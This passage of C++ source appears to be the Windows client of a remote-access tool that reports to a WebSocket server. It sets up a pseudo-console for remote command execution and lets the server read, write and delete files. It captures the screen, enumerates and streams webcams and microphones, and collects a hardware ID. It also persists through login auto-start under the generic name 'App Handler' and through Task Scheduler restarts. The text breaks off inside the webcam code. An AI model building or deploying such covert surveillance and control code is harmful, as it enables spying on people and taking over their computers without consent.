// Target Windows 10 or later (Required for PseudoConsole/ConPTY)
#define _WIN32_WINNT 0x0A00
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <netioapi.h>
#include <windows.h>
#include <winhttp.h>
#include <taskschd.h>
#include <comdef.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mfreadwrite.h>
#include <mmdeviceapi.h>
#include <Audioclient.h>
#include <Functiondiscoverykeys_devpkey.h>
#include <iostream>
#include <string>
#include <sstream>
#include <thread>
#include <mutex>
#include <atomic>
#include <memory>
#include <shlobj.h>
#include <lmcons.h>
#include <gdiplus.h>
#include <vector>
#include <algorithm>
#include <pdh.h>
#include <pdhmsg.h>
#include "json.hpp"

using namespace Gdiplus;
using json = nlohmann::json;

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "pdh.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "mf.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfreadwrite.lib")
#pragma comment(lib, "mfuuid.lib")

namespace Config {
    // Debug Mode
#ifdef _DEBUG

    const bool DEBUG_MODE = true;                    // Set false for production
#else
	const bool DEBUG_MODE = false;                   // Set false for production
#endif
    // WebSocket Server Configuration
    const wchar_t* SERVER_HOST = L"localhost";       // domain or localhost
    const int SERVER_PORT = 9991;                    // Change to your server port
    const bool USE_SSL = false;                      // Set true for ssl

    // Application Settings
    const wchar_t* APP_NAME = L"App Handler";        // Name in registry
    const bool AUTO_START = true;                    // Enable auto-start on login (ignored if DEBUG_MODE)
    const bool AUTO_RESTART_ON_CRASH = true;         // Enable Task Scheduler auto-restart

    // Reconnection Settings
    const int RECONNECT_DELAY_MS = 5000;             // Delay before reconnect (ms)
    const int MAX_RECONNECT_ATTEMPTS = 0;            // 0 = infinite retry
    const int RECONNECT_BACKOFF_MAX_MS = 60000;      // Max backoff delay (1 minute)
    const bool USE_EXPONENTIAL_BACKOFF = true;       // Increase delay on repeated failures
    
    // Keep-Alive Settings
    const int KEEP_ALIVE_INTERVAL_MS = 30000;        // Send ping every 30 seconds to prevent timeout

    // Terminal Settings
    const int CONSOLE_WIDTH = 120;                   // Terminal columns
    const int CONSOLE_HEIGHT = 30;                   // Terminal rows

    // Version
    const wchar_t* APP_VERSION = L"1.0.0";

    // User ID, get id in dashboard
    const wchar_t* USER_ID = L""; 
}

struct AppState {
    HANDLE hPipeIn = INVALID_HANDLE_VALUE;
    HANDLE hPipeOut = INVALID_HANDLE_VALUE;
    HPCON hPseudoConsole = nullptr;
    HANDLE hProcess = INVALID_HANDLE_VALUE;
    HINTERNET hSession = nullptr;
    HINTERNET hConnect = nullptr;
    HINTERNET hWebSocket = nullptr;
    std::atomic<bool> running{ true };
    std::atomic<bool> wsConnected{ false };
    std::atomic<bool> shouldReconnect{ true };
    std::mutex wsMutex;
    int reconnectAttempts = 0;
    DWORD lastPingTime = 0;
    DWORD lastMetricsTime = 0;
    ULONG_PTR gdiplusToken;

    // Streaming state
    std::atomic<bool> isStreamingScreen{ false };
    std::atomic<bool> isStreamingCam{ false };
    std::atomic<bool> isStreamingMic{ false };
    std::string currentDeviceId;
} g_state;

// Metrics Globals
PDH_HQUERY cpuQuery;
PDH_HCOUNTER cpuTotal;
unsigned long long lastNetUp = 0;
unsigned long long lastNetDown = 0;
DWORD lastNetCheck = 0;

typedef HRESULT(WINAPI* PFN_CreatePseudoConsole)(COORD, HANDLE, HANDLE, DWORD, HPCON*);
typedef void(WINAPI* PFN_ClosePseudoConsole)(HPCON);
typedef HRESULT(WINAPI* PFN_ResizePseudoConsole)(HPCON, COORD);

PFN_CreatePseudoConsole g_CreatePseudoConsole = nullptr;
PFN_ClosePseudoConsole g_ClosePseudoConsole = nullptr;
PFN_ResizePseudoConsole g_ResizePseudoConsole = nullptr;

// Forward declarations
void Cleanup(bool fullCleanup = false);
bool CreateConPTY();
bool ConnectWebSocket(const std::string& deviceId, const std::string& deviceName);

// Load ConPTY API
bool LoadConPTYAPI() {
    HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel) return false;

    g_CreatePseudoConsole = (PFN_CreatePseudoConsole)GetProcAddress(hKernel, "CreatePseudoConsole");
    g_ClosePseudoConsole = (PFN_ClosePseudoConsole)GetProcAddress(hKernel, "ClosePseudoConsole");
    g_ResizePseudoConsole = (PFN_ResizePseudoConsole)GetProcAddress(hKernel, "ResizePseudoConsole");

    return (g_CreatePseudoConsole && g_ClosePseudoConsole && g_ResizePseudoConsole);
}

void InitMetrics() {
    PdhOpenQuery(NULL, NULL, &cpuQuery);
    PdhAddEnglishCounter(cpuQuery, L"\\Processor(_Total)\\% Processor Time", NULL, &cpuTotal);
    PdhCollectQueryData(cpuQuery);
}

double GetCpuUsage() {
    PDH_FMT_COUNTERVALUE counterVal;
    PdhCollectQueryData(cpuQuery);
    PdhGetFormattedCounterValue(cpuTotal, PDH_FMT_DOUBLE, NULL, &counterVal);
    return counterVal.doubleValue;
}

int GetRamUsage() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    return memInfo.dwMemoryLoad; // % usage
}

int GetDiskUsage() {
    ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
    if (GetDiskFreeSpaceEx(L"C:\\", &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
        double total = (double)totalNumberOfBytes.QuadPart;
        double free = (double)totalNumberOfFreeBytes.QuadPart;
        return (int)((1.0 - (free / total)) * 100.0);
    }
    return 0;
}

struct NetStats {
    double upKBps;
    double downKBps;
};

NetStats GetNetworkUsage() {
    MIB_IF_TABLE2* table;
    if (GetIfTable2(&table) != NO_ERROR) return { 0, 0 };

    unsigned long long totalTx = 0;
    unsigned long long totalRx = 0;

    for (int i = 0; i < table->NumEntries; i++) {
        totalTx += table->Table[i].OutOctets;
        totalRx += table->Table[i].InOctets;
    }
    FreeMibTable(table);

    DWORD now = GetTickCount();
    double timeDiff = (now - lastNetCheck) / 1000.0;
    if (timeDiff < 0.1) return { 0, 0 }; // Too fast

    double upSpeed = 0;
    double downSpeed = 0;

    if (lastNetCheck != 0) {
        upSpeed = (totalTx - lastNetUp) / timeDiff / 1024.0; // KB/s
        downSpeed = (totalRx - lastNetDown) / timeDiff / 1024.0; // KB/s
    }

    lastNetUp = totalTx;
    lastNetDown = totalRx;
    lastNetCheck = now;

    return { upSpeed, downSpeed };
}

// Get HWID using WMIC
std::string GetHWID() {
    std::string hwid;
    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };

    if (CreatePipe(&hRead, &hWrite, &sa, 0)) {
        STARTUPINFOW si = { sizeof(STARTUPINFOW) };
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi = {};
        wchar_t cmd[] = L"wmic csproduct get uuid";

        if (CreateProcessW(nullptr, cmd, nullptr, nullptr, TRUE,
            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {

            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(hWrite);

            char buffer[512];
            DWORD bytesRead;
            std::string output;

            while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                output += buffer;
            }

            // Parse UUID from output
            size_t pos = output.find('\n');
            if (pos != std::string::npos && pos + 1 < output.size()) {
                std::string line = output.substr(pos + 1);
                size_t start = line.find_first_not_of(" \t\r\n");
                size_t end = line.find_last_not_of(" \t\r\n");
                if (start != std::string::npos && end != std::string::npos) {
                    hwid = line.substr(start, end - start + 1);
                }
            }

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        else {
            CloseHandle(hWrite);
        }
        CloseHandle(hRead);
    }

    // Fallback
    if (hwid.empty()) {
        wchar_t hostname[MAX_COMPUTERNAME_LENGTH + 1];
        wchar_t username[UNLEN + 1];
        DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
        GetComputerNameW(hostname, &size);
        size = UNLEN + 1;
        GetUserNameW(username, &size);

        char hBuffer[512], uBuffer[512];
        WideCharToMultiByte(CP_UTF8, 0, hostname, -1, hBuffer, sizeof(hBuffer), nullptr, nullptr);
        WideCharToMultiByte(CP_UTF8, 0, username, -1, uBuffer, sizeof(uBuffer), nullptr, nullptr);
        hwid = std::string(hBuffer) + "-" + std::string(uBuffer);
    }

    return hwid;
}

// ============ File System Helpers ============

// Forward declaration
std::string Base64Encode(unsigned char const* bytes_to_encode, unsigned int in_len);

std::string WideToUtf8(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), nullptr, 0, nullptr, nullptr);
    std::string str(size, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &str[0], size, nullptr, nullptr);
    return str;
}

std::wstring Utf8ToWide(const std::string& str) {
    if (str.empty()) return std::wstring();
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), nullptr, 0);
    std::wstring wstr(size, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), &wstr[0], size);
    return wstr;
}

void SendWsMessage(const json& msg) {
    std::string msgStr = msg.dump();
    printf("[SENT]: %s\n", msgStr.c_str());
    std::lock_guard<std::mutex> lock(g_state.wsMutex);
    if (g_state.hWebSocket && g_state.wsConnected) {
        WinHttpWebSocketSend(g_state.hWebSocket,
            WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
            (PVOID)msgStr.c_str(), (DWORD)msgStr.length());
    }
}

void HandleFileSystemCommand(const json& msg) {
    std::string action = msg.value("action", "");
    std::string path = msg.value("path", "");
    std::string requestId = msg.value("requestId", "");

    // Security: Basic path traversal protection
    if (path.find("..") != std::string::npos || (msg.contains("newPath") && msg["newPath"].get<std::string>().find("..") != std::string::npos)) {
        json response;
        response["type"] = "filesystem";
        response["action"] = action;
        response["requestId"] = requestId;
        response["success"] = false;
        response["error"] = "Access denied: Path traversal detected";
        SendWsMessage(response);
        return;
    }
    
    json response;
    response["type"] = "filesystem";
    response["action"] = action;
    response["requestId"] = requestId;
    std::wstring wpath = Utf8ToWide(path);
    
    if (action == "ls") {
        // List directory contents
        json files = json::array();
        std::wstring searchPath = wpath;
        if (!searchPath.empty() && searchPath.back() != L'\\') {
            searchPath += L"\\";
        }
        searchPath += L"*";
        printf("SearchPath: %s\n", searchPath.c_str());
        WIN32_FIND_DATAW findData;
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            printf("Valid\n");

            do {
                std::wstring name = findData.cFileName;
                if (name == L"." || name == L"..") continue;
                
                json fileInfo;
                fileInfo["name"] = WideToUtf8(name);
                fileInfo["isDir"] = (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
                
                ULARGE_INTEGER fileSize;
                fileSize.LowPart = findData.nFileSizeLow;
                fileSize.HighPart = findData.nFileSizeHigh;
                fileInfo["size"] = fileSize.QuadPart;
                
                // Convert FILETIME to milliseconds since epoch
                ULARGE_INTEGER ftime;
                ftime.LowPart = findData.ftLastWriteTime.dwLowDateTime;
                ftime.HighPart = findData.ftLastWriteTime.dwHighDateTime;
                // Windows FILETIME is 100-nanosecond intervals since Jan 1, 1601
                // Convert to Unix timestamp (ms since 1970)
                fileInfo["modifiedAt"] = (ftime.QuadPart - 116444736000000000ULL) / 10000;
                
                files.push_back(fileInfo);
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
            
            response["success"] = true;
            response["data"] = files;
            response["path"] = path;
        } else {
            response["success"] = false;
            response["error"] = "Failed to list directory";
        }
    }
    else if (action == "read") {
        long long offset = msg.value("offset", 0LL);
        long long length = msg.value("length", 1024LL * 1024LL); // Default 1MB chunk
        
        HANDLE hFile = CreateFileW(wpath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        
        if (hFile != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER fileSize;
            GetFileSizeEx(hFile, &fileSize);
            response["totalSize"] = fileSize.QuadPart;

            if (offset >= fileSize.QuadPart) {
                response["success"] = true;
                response["data"] = "";
                response["size"] = 0;
            } else {
                if (offset + length > fileSize.QuadPart) {
                    length = fileSize.QuadPart - offset;
                }

                LARGE_INTEGER liOffset;
                liOffset.QuadPart = offset;
                SetFilePointerEx(hFile, liOffset, nullptr, FILE_BEGIN);

                std::vector<BYTE> buffer((size_t)length);
                DWORD bytesRead;
                if (ReadFile(hFile, buffer.data(), (DWORD)buffer.size(), &bytesRead, nullptr)) {
                    response["success"] = true;
                    response["data"] = Base64Encode(buffer.data(), bytesRead);
                    response["size"] = bytesRead;
                    response["offset"] = offset;
                } else {
                    response["success"] = false;
                    response["error"] = "Failed to read file";
                }
            }
            CloseHandle(hFile);
        } else {
            response["success"] = false;
            response["error"] = "Failed to open file";
        }
    }
    else if (action == "write") {
        // Write base64 data to file
        std::string data = msg.value("data", "");
        
        // Decode base64
        std::vector<BYTE> decoded;
        // Simple base64 decode
        auto base64_decode = [](const std::string& encoded) -> std::vector<BYTE> {
            std::vector<BYTE> result;
            static const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            std::vector<int> T(256, -1);
            for (int i = 0; i < 64; i++) T[chars[i]] = i;
            
            int val = 0, valb = -8;
            for (unsigned char c : encoded) {
                if (T[c] == -1) break;
                val = (val << 6) + T[c];
                valb += 6;
                if (valb >= 0) {
                    result.push_back((BYTE)((val >> valb) & 0xFF));
                    valb -= 8;
                }
            }
            return result;
        };
        
        decoded = base64_decode(data);
        
        HANDLE hFile = CreateFileW(wpath.c_str(), GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD bytesWritten;
            if (WriteFile(hFile, decoded.data(), (DWORD)decoded.size(), &bytesWritten, nullptr)) {
                response["success"] = true;
                response["size"] = bytesWritten;
            } else {
                response["success"] = false;
                response["error"] = "Failed to write file";
            }
            CloseHandle(hFile);
        } else {
            response["success"] = false;
            response["error"] = "Failed to create file";
        }
    }
    else if (action == "delete") {
        DWORD attrs = GetFileAttributesW(wpath.c_str());
        if (attrs == INVALID_FILE_ATTRIBUTES) {
            response["success"] = false;
            response["error"] = "File/folder not found";
        } else if (attrs & FILE_ATTRIBUTE_DIRECTORY) {
            if (RemoveDirectoryW(wpath.c_str())) {
                response["success"] = true;
            } else {
                response["success"] = false;
                response["error"] = "Failed to delete directory (must be empty)";
            }
        } else {
            if (DeleteFileW(wpath.c_str())) {
                response["success"] = true;
            } else {
                response["success"] = false;
                response["error"] = "Failed to delete file";
            }
        }
    }
    else if (action == "rename") {
        std::string newPath = msg.value("newPath", "");
        std::wstring wnewPath = Utf8ToWide(newPath);
        
        if (MoveFileW(wpath.c_str(), wnewPath.c_str())) {
            response["success"] = true;
        } else {
            response["success"] = false;
            response["error"] = "Failed to rename";
        }
    }
    else if (action == "mkdir") {
        if (CreateDirectoryW(wpath.c_str(), nullptr)) {
            response["success"] = true;
        } else {
            DWORD err = GetLastError();
            if (err == ERROR_ALREADY_EXISTS) {
                response["success"] = true; // Already exists, consider it success
            } else {
                response["success"] = false;
                response["error"] = "Failed to create directory";
            }
        }
    }
    else if (action == "drives") {
        DWORD drives = GetLogicalDrives();
        json driveList = json::array();
        for (int i = 0; i < 26; i++) {
            if (drives & (1 << i)) {
                std::string driveName;
                driveName += (char)('A' + i);
                driveName += ":\\";
                driveList.push_back(driveName);
            }
        }
        response["success"] = true;
        response["data"] = driveList;
    }
    else {
        response["success"] = false;
        response["error"] = "Unknown action";
    }
    SendWsMessage(response);
}

// Base64 Encoding
static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::string Base64Encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while (i++ < 3)
            ret += '=';
    }

    return ret;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes

    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;  // Failure

    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;  // Failure

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}

std::string CaptureScreenBase64() {
    int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, x2, y2);
    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);

    BitBlt(hDC, 0, 0, x2, y2, hScreen, x1, y1, SRCCOPY);

    // Draw mouse cursor
    CURSORINFO ci = { sizeof(CURSORINFO) };
    if (GetCursorInfo(&ci) && (ci.flags & CURSOR_SHOWING)) {
        ICONINFO ii = { sizeof(ICONINFO) };
        if (GetIconInfo(ci.hCursor, &ii)) {
            DrawIcon(hDC, ci.ptScreenPos.x - x1 - ii.xHotspot, ci.ptScreenPos.y - y1 - ii.yHotspot, ci.hCursor);
            if (ii.hbmMask) DeleteObject(ii.hbmMask);
            if (ii.hbmColor) DeleteObject(ii.hbmColor);
        }
    }

    // Create GDI+ Bitmap from HBITMAP
    Bitmap* bitmap = new Bitmap(hBitmap, NULL);

    // Save to memory stream
    IStream* pStream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &pStream);

    CLSID clsid;
    GetEncoderClsid(L"image/png", &clsid);

    // Resize down if too big to save bandwidth (Optional, keeping full res for now but good to note)
    // For now we'll save as PNG to the stream
    bitmap->Save(pStream, &clsid, NULL);

    // Get bytes from stream
    LARGE_INTEGER liZero = {};
    ULARGE_INTEGER pos = {};
    pStream->Seek(liZero, STREAM_SEEK_SET, &pos);

    // Get size
    STATSTG statstg;
    pStream->Stat(&statstg, STATFLAG_NONAME);
    ULONG streamSize = (ULONG)statstg.cbSize.QuadPart;

    std::vector<BYTE> buffer(streamSize);
    ULONG bytesRead;
    pStream->Seek(liZero, STREAM_SEEK_SET, &pos);
    pStream->Read(buffer.data(), streamSize, &bytesRead);

    // Clean up
    pStream->Release();
    delete bitmap;
    SelectObject(hDC, old_obj);
    DeleteObject(hBitmap);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);

    return Base64Encode(buffer.data(), buffer.size());
}

std::vector<std::string> EnumerateWebcams() {
    std::vector<std::string> devices;
    if (FAILED(MFStartup(MF_VERSION))) return devices;

    IMFAttributes* pAttributes = nullptr;
    if (SUCCEEDED(MFCreateAttributes(&pAttributes, 1))) {
        pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);

        IMFActivate** ppDevices = nullptr;
        UINT32 count = 0;
        if (SUCCEEDED(MFEnumDeviceSources(pAttributes, &ppDevices, &count))) {
            for (UINT32 i = 0; i < count; i++) {
                WCHAR* name = nullptr;
                UINT32 length = 0;
                if (SUCCEEDED(ppDevices[i]->GetAllocatedString(MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME, &name, &length))) {
                    char buf[512];
                    WideCharToMultiByte(CP_UTF8, 0, name, -1, buf, sizeof(buf), nullptr, nullptr);
                    devices.push_back(std::string(buf));
                    CoTaskMemFree(name);
                } else {
                    devices.push_back("Camera " + std::to_string(i + 1));
                }
                ppDevices[i]->Release();
            }
            CoTaskMemFree(ppDevices);
        }
        pAttributes->Release();
    }
    MFShutdown();
    return devices;
}

std::vector<std::string> EnumerateMicrophones() {
    std::vector<std::string> devices;
    HRESULT hrCoInit = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    IMMDeviceEnumerator* pEnumerator = nullptr;
    if (SUCCEEDED(CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator))) {
        IMMDeviceCollection* pCollection = nullptr;
        if (SUCCEEDED(pEnumerator->EnumAudioEndpoints(eCapture, DEVICE_STATE_ACTIVE, &pCollection))) {
            UINT count = 0;
            pCollection->GetCount(&count);
            for (UINT i = 0; i < count; i++) {
                IMMDevice* pEndpoint = nullptr;
                if (SUCCEEDED(pCollection->Item(i, &pEndpoint))) {
                    IPropertyStore* pProps = nullptr;
                    if (SUCCEEDED(pEndpoint->OpenPropertyStore(STGM_READ, &pProps))) {
                        PROPVARIANT varName;
                        PropVariantInit(&varName);
                        if (SUCCEEDED(pProps->GetValue(PKEY_Device_FriendlyName, &varName))) {
                            char buf[512];
                            WideCharToMultiByte(CP_UTF8, 0, varName.pwszVal, -1, buf, sizeof(buf), nullptr, nullptr);
                            devices.push_back(std::string(buf));
                            PropVariantClear(&varName);
                        } else {
                           devices.push_back("Microphone " + std::to_string(i+1));
                        }
                        pProps->Release();
                    }
                    pEndpoint->Release();
                }
            }
            pCollection->Release();
        }
        pEnumerator->Release();
    }
    if (SUCCEEDED(hrCoInit)) CoUninitialize();
    return devices;
}

std::vector<BYTE> CaptureScreenBytes(int quality) {
    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    
    int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, x2, y2);
    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);

    BitBlt(hDC, 0, 0, x2, y2, hScreen, x1, y1, SRCCOPY);

    // Draw mouse cursor
    CURSORINFO ci = { sizeof(CURSORINFO) };
    if (GetCursorInfo(&ci) && (ci.flags & CURSOR_SHOWING)) {
        ICONINFO ii = { sizeof(ICONINFO) };
        if (GetIconInfo(ci.hCursor, &ii)) {
            DrawIcon(hDC, ci.ptScreenPos.x - x1 - ii.xHotspot, ci.ptScreenPos.y - y1 - ii.yHotspot, ci.hCursor);
            if (ii.hbmMask) DeleteObject(ii.hbmMask);
            if (ii.hbmColor) DeleteObject(ii.hbmColor);
        }
    }
    Bitmap* bitmap = new Bitmap(hBitmap, NULL);
    
    IStream* pStream = NULL;
    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    
    CLSID clsid;
    GetEncoderClsid(L"image/jpeg", &clsid);
    
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG qual = (ULONG)quality;
    encoderParams.Parameter[0].Value = &qual;

    bitmap->Save(pStream, &clsid, &encoderParams);
    
    LARGE_INTEGER liZero = {};
    pStream->Seek(liZero, STREAM_SEEK_SET, NULL);
    
    STATSTG statstg;
    pStream->Stat(&statstg, STATFLAG_NONAME);
    ULONG streamSize = (ULONG)statstg.cbSize.QuadPart;
    
    std::vector<BYTE> buffer(streamSize);
    ULONG bytesRead;
    pStream->Read(buffer.data(), streamSize, &bytesRead);
    
    pStream->Release();
    delete bitmap;
    SelectObject(hDC, old_obj);
    DeleteObject(hBitmap);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    
    return buffer;
}

class WebcamStreamer {
    IMFSourceReader* pReader = nullptr;
    IMFMediaSource* pSource = nullptr;
    IMFAttributes* pAttributes = nullptr;
    IMFActivate** ppDevices = nullptr;
    UINT32 count = 0;
    UINT32 width = 0, height = 0;
    LONG stride = 0;
    bool initialized = false;
    bool m_use32Bit = false;
    int m_deviceIndex = 0;
public:
    WebcamStreamer(int index) : m_deviceIndex(index) { MFStartup(MF_VERSION); }
    ~WebcamStreamer() {
        if (pReader) pReader->Release();
        if (pSource) pSource->Release();
        if (pAttributes) pAttributes->Release();
        if (ppDevices) {
            for (UINT32 i = 0; i < count; i++) ppDevices[i]->Release();
            CoTaskMemFree(ppDevices);
        }
        MFShutdown();
    }

    bool Initialize(int deviceIndex) {
        if (initialized) return true;
        
        printf("[Webcam] Initializing device index %d...\n", deviceIndex);
        
        HRESULT hr = MFCreateAttributes(&pAttributes, 1);
        if (FAILED(hr)) {
            printf("[Webcam] Failed to create attributes: 0x%08X\n", hr);
            return false;
        }

        hr = pAttributes->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE, MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
        if (FAILED(hr)) {
            printf("[Webcam] Failed to set VIDCAP attribute: 0x%08X\n", hr);
            return false;
        }

        hr = MFEnumDeviceSources(pAttributes, &ppDevices, &count);
        if (FAILED(hr)) {
            printf("[Webcam] Failed to enum devices: 0x%08X\n", hr);
            return false;
        }

        if (count == 0 || deviceIndex >= (int)count) {
            printf("[Webcam] Device index %d out of range (count: %d)\n", deviceIndex, count);
            return false;
        }

        hr = ppDevices[deviceIndex]->ActivateObject(IID_PPV_ARGS(&pSource));
        if (FAILED(hr)) {
            printf("[Webcam] Failed to activate device: 0x%08X\n", hr);
            return false;
        }

        IMFAttributes* pReaderAttrs = nullptr;
        hr = MFCreateAttributes(&pReaderAttrs, 1);
        if (SUCCEEDED(hr)) {
            pReaderAttrs->SetUINT32(MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING, TRUE);
            pReaderAttrs->SetUINT32(MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS, TRUE);
        }

        hr = MFCreateSourceReaderFromMediaSource(pSource, pReaderAttrs, &pReader);
        if (pReaderAttrs) pReaderAttrs->Release();

        if (FAILED(hr)) {
            printf("[Webcam] Failed to create source reader: 0x%08X\n", hr);
            return false;
        }

        // Setup format
        hr = pReader->SetStreamSelection(MF_SOURCE_READER_ALL_STREAMS, FALSE);
        hr = pReader->SetStreamSelection(MF_SOURCE_READER_FIRST_VIDEO_STREAM, TRUE);

        // Try color formats in order of preference
        GUID formats[] = { MFVideoFormat_RGB24, MFVideoFormat_RGB32 };
        bool formatSet = false;
        
        IMFMediaType* pType = nullptr;
        MFCreateMediaType(&pType);
        pType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);

        for (const auto& fmt : formats) {
            pType->SetGUID(MF_MT_SUBTYPE, fmt);
            hr = pReader->SetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, nullptr, pType);
            if (SUCCEEDED(hr)) {
                formatSet = true;
                if (fmt == MFVideoFormat_RGB32) {
                    printf("[Webcam] Falling back to RGB32 format\n");
                    m_use32Bit = true;
                } else {
                    printf("[Webcam] Using RGB24 format\n");
                    m_use32Bit = false;
                }
                break;
            }
        }

        if (!formatSet) {
            printf("[Webcam] Could not set any supported RGB format: 0x%08X\n", hr);
            pType->Release();
            return false;
        }
        pType->Release();

        IMFMediaType* pCurrentType = nullptr;
        if (SUCCEEDED(pReader->GetCurrentMediaType((DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM, &pCurrentType))) {
            MFGetAttributeSize(pCurrentType, MF_MT_FRAME_SIZE, &width, &height);
            if (FAILED(pCurrentType->GetUINT32(MF_MT_DEFAULT_STRIDE, (UINT32*)&stride))) {
